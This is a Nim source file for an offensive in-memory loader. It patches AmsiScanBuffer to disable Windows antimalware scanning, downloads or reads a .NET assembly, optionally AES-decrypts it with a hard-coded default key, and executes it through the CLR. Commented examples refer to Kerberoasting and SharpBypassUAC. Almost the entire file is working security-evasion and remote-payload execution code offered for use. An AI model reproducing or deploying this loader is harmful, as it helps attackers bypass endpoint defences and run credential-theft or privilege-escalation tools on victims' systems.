

import strutils # basic string manipulation functionality
import dynlib # for our AMSI bypass
import byteutils # basic byte manipulation functionality 
import nimcrypto # for decryption
import nimcrypto/sysrand # for decryption
import winim/lean # for core SDK only, this speed up compiling time.
import strformat # string formatting
import std/parseopt # option parser
import sugar # assembly dump functionality
import winim/clr except `[]`     # Common Language Runtime Support. Exclude []  or it throws a runtime recursion error!
import shlex #parameter splitting
import std/httpclient

# import nre # regex parsing. Returns "could not load: pcre64.dll" in runtime
# import std/re # regex matching. Returns "could not load: pcre64.dll" in runtime 

const iv: array[aes256.sizeBlock, byte]= [byte 55, 19, 19, 173, 190, 70, 130, 254, 26, 241, 14, 4, 213, 94, 108, 237]
const envkey: string = "TARGETDOMAIN"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

func toString*(bytes: openArray[byte]): string {.inline.} =
  ## Converts a byte sequence to the corresponding string.
  let length = bytes.len
  if length > 0:
    result = newString(length)
    copyMem(result.cstring, bytes[0].unsafeAddr, length)


proc decryptText(contents: string,passkeystr: string): string =  
    # some var definitions for decrypting
    var 
        data: seq[byte] = toByteSeq(contents) # contains array of bytes with the content of file
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte] # byte array the size of key
        plaintext = newSeq[byte](len(data)) # blank array of bytes to contain plaintext
        transformedText = newSeq[byte](len(data)) # blank array of bytes to contain decrypted


    echo "Step 0: copy incomming array of bytes to plaintext array "
    copyMem(addr plaintext[0], addr data[0], len(data)) #copy incoming array of bytes to plaintext array
    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedkey = sha256.digest(passkeystr) # digest of our key

    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data)) # copy digest to key array
    ectx.init(key, iv) 


    echo "step 1: Decrypting"
    ectx.decrypt(plaintext, transformedText) # decrypt plaintext into transformedText
    echo "step 2: Convert to string"

    var newText=transformedText.toString() # convert tranformed text to string
    var inFile="SharpBypassUAC.exeNimByteArray.txt_enc.txt"
    writeFile(inFile&"_dec.txt", transformedText)     
    result = newText


proc download(url: string):string=
    var client = newHttpClient()
    var text: string=""
    text=client.getContent(url)
    result=text.strip(leading = true, trailing = true)


proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled









when isMainModule:

    var decrypt: bool=false # option to decrypt
    var debug: bool=false # to enable/disable debug mode
    var inFile: string= "" # will hold input byte array file
    var helpMsg: string="nimLoader.exe [-d] [-p:'parameters']  file.txt" # help msg
    var parameters: string="" # parameters to the program to launch
    var passkeystr:string=envkey# default key to our constant

    # OUR OPTION PARSER
    var parser = initOptParser() 
    while true:
      parser.next()
      case parser.kind
      of cmdEnd: 
        break
      of cmdShortOption, cmdLongOption:
        if parser.val == "": #just options "-x"
          if parser.key=="d": # decrypt option
            decrypt=true
          elif parser.key=="D": # debug option
            debug=true
          elif parser.key=="h": # help option
            echo helpMsg
            quit(QuitSuccess)

        else:
          if parser.key=="p": # parameters option
            parameters=parser.val
          if parser.key=="k": # key option
            passkeystr=parser.val

      of cmdArgument:
        inFile=parser.key # argument input file

    if inFile=="":
      quit()


    #######################
    # 1. FIRST, PATCH AMSI
    #######################
    var success = PatchAmsi()
    if  debug:
      echo fmt"[*] AMSI disabled: {bool(success)}"

    if not success:
      echo "[-] AMSI not disabled:"
      quit()

    #######################
    # 2. GET THE TOOL'S BYTES
    #######################
    var contents: string=""
    if debug:
      echo "Identify input:", inFile

    if inFile[0..6]=="http://" or inFile[0..7]=="https://":
      if debug:
        echo "Input is Url. Downloading and loading"
        contents =download(inFile)
    else:
      if debug:
        echo "Input is File. Loading"



      #var contents = readFile(inFile).string.strip() # read file contents
      contents = readFile(inFile).strip(leading = true, trailing = true)# read file contents
      #var contents = readFile(inFile).stripLineEnd # read file contents
      #contents=contents.stripLineEnd() 
    if debug:
      echo "Tool parameters are:" & parameters

    if decrypt: # DECRYPT IF NECESSARY
      if debug:
        echo "Decrypting the file..."
      contents=decryptText(contents,passkeystr).strip(leading = true, trailing = true)


    
    # # THIS PROCESSING IS FOR CONVENIENCE AFTER USING CsharpToNimByteArray.ps1
    # let parts=contents.split(" ") # our executable byte array has the var definition, see next line. Remove that
    # # var buf: array[1, byte] = [byte 0x4D,0x...]
    # let payloadStr=parts[6][0..^3] # our byte array is in the 6th position. Remove last 3 bytes
    var payloadStr:string=contents
    # REGEX OPTIONS GIVING RUNTIME ERROR "could not load: pcre64.dll"
    # first nre try:
    # let payloadStr=contents.find(re"^.*\[byte\ (.*)\].*$").get.captures[0]      
    # second std/re try:
    # var payloadStr: string=""
    # var matches: array[1, string]
    # if contents.find(re"^.*\[byte\ (.*)\].*$",matches)==0:
    #   payloadStr=matches[0]
    # else:
    #   quit()

    if debug:
      echo "payloadStr start:"
      echo payloadStr[0..30]        
      echo "payloadStr end:"
      echo payloadStr[^20..^1]

    let payloadParts=payloadStr.split(",") # split bytes
    var buf:seq[byte] # define buf as bytes seq
    if debug:
      echo "Adding to buffer..."
    for i in payloadParts:
      # echo i
      buf.add(hexToSeqByte(i))


      # if debug:
      #   echo "[*].NET versions"
      #   for v in clrVersions():
      #       # echo fmt"    \--- {v}"
      #       echo v
      #   echo "\n"

    if debug:
      echo "Loading buffer to assembly..."    
    var assembly = load(buf)
    if debug:
      echo "Dumping assembly..."    
    dump assembly

    if debug:
      echo "Loading parameter array..."    
    #var arr = toCLRVariant(["kerberoast", "/format:hashcat"], VT_BSTR)

    var arr = toCLRVariant(shlex(parameters).words, VT_BSTR) # passing some args
    if debug:
      echo "Invoking assembly..."    
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
    if debug:
      echo "Done!"    


